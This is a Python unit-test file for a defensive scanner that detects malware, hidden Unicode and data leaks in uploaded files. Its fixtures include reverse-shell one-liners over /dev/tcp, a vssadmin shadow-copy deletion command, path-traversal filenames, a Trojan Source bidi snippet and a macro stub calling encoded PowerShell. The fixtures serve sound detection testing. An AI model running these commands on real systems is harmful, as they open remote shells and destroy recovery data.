import io
import unittest
import zipfile
from fastapi import UploadFile

from app.detector import scan_text
from app.malware_scanner import (
    calculate_entropy,
    decode_zero_width_binary,
    sanitize_filename,
    scan_disguised_executables,
    scan_for_malware_and_invisible_code,
    scan_invisible_unicode,
    scan_known_malware_and_patterns,
    scan_office_macros_and_embedded_exploits,
    scan_pdf_active_threats,
    scan_zip_bomb_safety,
)
from app.main import scan_payload


class TestSentinelCore(unittest.IsolatedAsyncioTestCase):

    def test_sanitize_filename(self):
        # Path traversal and null byte neutralization
        self.assertEqual(sanitize_filename("../../etc/passwd"), "passwd")
        self.assertEqual(sanitize_filename("..\\..\\Windows\\System32\\calc.exe"), "calc.exe")
        self.assertEqual(sanitize_filename("payload\x00.pdf"), "payload.pdf")
        self.assertEqual(sanitize_filename(None), "unnamed_stream.bin")

    def test_clean_file_nominal(self):
        content = b"This is a benign corporate invoice without leaks or malware."
        res = scan_for_malware_and_invisible_code("invoice.txt", content, content.decode())
        self.assertEqual(res["threat_status"], "CLEAN")
        self.assertEqual(res["threat_count"], 0)
        self.assertEqual(res["threat_level"], "NOMINAL")

    def test_invisible_unicode_zero_width(self):
        # Hidden zero-width characters in text
        text = "function test() {\n    return 'VALID\u200B\u200C\u200D\u2060KEY';\n}"
        findings = scan_invisible_unicode(text)
        self.assertGreaterEqual(len(findings), 1)
        self.assertTrue(any("Zero-Width" in f["category"] for f in findings))

    def test_zero_width_steganography_decoding(self):
        # Encode "HI" (H=01001000, I=01001001) in ZWSP (\u200B=0) and ZWNJ (\u200C=1)
        # H: 01001000 -> \u200B\u200C\u200B\u200B\u200C\u200B\u200B\u200B
        # I: 01001001 -> \u200B\u200C\u200B\u200B\u200C\u200B\u200B\u200C
        encoded = "\u200B\u200C\u200B\u200B\u200C\u200B\u200B\u200B\u200B\u200C\u200B\u200B\u200C\u200B\u200B\u200C"
        decoded = decode_zero_width_binary(encoded)
        self.assertEqual(decoded, "HI")

    def test_trojan_source_bidi_override(self):
        # CVE-2021-42574 Trojan Source Bidi override
        code = "def auth():\n    isAdmin = false;\n    /*\u202E } \u2066if (isAdmin)\u2069 \u2066*/ return true;\n"
        findings = scan_invisible_unicode(code)
        self.assertTrue(any("Trojan Source" in f["category"] for f in findings))
        self.assertTrue(any(f["severity"] == "Critical" for f in findings))

    def test_disguised_executable_pe(self):
        # Windows PE executable starting with MZ disguised as a PDF
        pe_header = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
        findings = scan_disguised_executables("quarterly_report.pdf", pe_header)
        self.assertGreaterEqual(len(findings), 1)
        self.assertTrue(any("Disguised Windows Executable" in f["category"] for f in findings))

    def test_disguised_executable_elf(self):
        # Linux ELF binary disguised as a DOCX
        elf_header = b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        findings = scan_disguised_executables("notes.docx", elf_header)
        self.assertGreaterEqual(len(findings), 1)
        self.assertTrue(any("Disguised Linux Binary" in f["category"] for f in findings))

    def test_double_extension_deception(self):
        # Double extension social engineering attack
        findings = scan_disguised_executables("salary_slip.pdf.exe", b"test content")
        self.assertTrue(any("Double Extension" in f["category"] for f in findings))

    def test_office_macro_inspection(self):
        # Word document containing vbaProject.bin with auto-exec Shell call
        bio = io.BytesIO()
        with zipfile.ZipFile(bio, "w") as zf:
            zf.writestr("[Content_Types].xml", "<Types></Types>")
            zf.writestr("word/vbaProject.bin", b"Sub AutoOpen()\nShell('powershell.exe -enc ...')\nEnd Sub")
        findings = scan_office_macros_and_embedded_exploits("invoice.docx", bio.getvalue())
        self.assertGreaterEqual(len(findings), 1)
        self.assertTrue(any("VBA" in f["category"] for f in findings))

    def test_pdf_javascript_and_openaction(self):
        # PDF with embedded JavaScript and auto-execute /OpenAction
        pdf_bytes = (
            b"%PDF-1.4\n"
            b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>\nendobj\n"
            b"3 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert('PWNED');) >>\nendobj\n"
            b"%%EOF"
        )
        findings = scan_pdf_active_threats(pdf_bytes)
        self.assertGreaterEqual(len(findings), 1)
        self.assertTrue(any("JavaScript" in f["category"] for f in findings))

    def test_known_malware_eicar_signature(self):
        # Standard EICAR Anti-Virus signature test
        eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        findings = scan_known_malware_and_patterns("", eicar)
        self.assertTrue(any("EICAR" in f["category"] for f in findings))

    def test_reverse_shell_and_ransomware_patterns(self):
        # Reverse shell invocation
        rev_shell = "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"
        findings = scan_known_malware_and_patterns(rev_shell, rev_shell.encode())
        self.assertTrue(any("Reverse Shell" in f["category"] for f in findings))

        # Ransomware shadow copy destruction
        ransom = "vssadmin delete shadows /all /quiet"
        findings_r = scan_known_malware_and_patterns(ransom, ransom.encode())
        self.assertTrue(any("Shadow Copy" in f["category"] for f in findings_r))

    def test_zip_bomb_safety_threshold(self):
        # Mock archive with high compression ratio
        bio = io.BytesIO()
        with zipfile.ZipFile(bio, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            # 10 MB of zeros compresses to ~10 KB
            zf.writestr("zero.dat", b"\x00" * (10 * 1024 * 1024))
        raw_zip = bio.getvalue()
        is_safe, threat = scan_zip_bomb_safety(raw_zip)
        # Should detect high ratio or decompression bomb
        self.assertIsNotNone(threat)
        self.assertTrue("Decompression Bomb" in threat["category"])

    def test_shannon_entropy_calculation(self):
        # Low entropy: repeated byte
        low_ent = calculate_entropy(b"A" * 1000)
        self.assertLess(low_ent, 1.0)

        # High entropy: pseudo-random / encrypted
        import os
        random_bytes = os.urandom(2048)
        high_ent = calculate_entropy(random_bytes)
        self.assertGreater(high_ent, 7.5)

    async def test_full_api_scan_endpoint_integration(self):
        # Test direct text with both data leak and malware
        payload = (
            "User: alice@example.com\n"
            "Credit Card: 4532-0150-1234-5671\n"
            "Reverse Shell: bash -i >& /dev/tcp/1.2.3.4/8080 0>&1\n"
        )
        res = await scan_payload(text=payload)
        self.assertEqual(res["status"], "success")
        self.assertEqual(res["risk_level"], "CRITICAL")
        self.assertGreaterEqual(res["leak_count"], 2)
        self.assertGreaterEqual(res["malware_threat_count"], 1)
        self.assertTrue(res["safety_sandbox"]["zero_execution_guarantee"])

    async def test_sanitize_endpoint(self):
        from app.main import sanitize_payload
        dirty_text = "clean\u200B\u200Ctext\u202Ereversed\u2069"
        res = await sanitize_payload(text=dirty_text)
        self.assertEqual(res["status"], "success")
        self.assertEqual(res["removed_characters_count"], 4)
        self.assertEqual(res["sanitized_text"], "cleantextreversed")


if __name__ == "__main__":
    unittest.main()

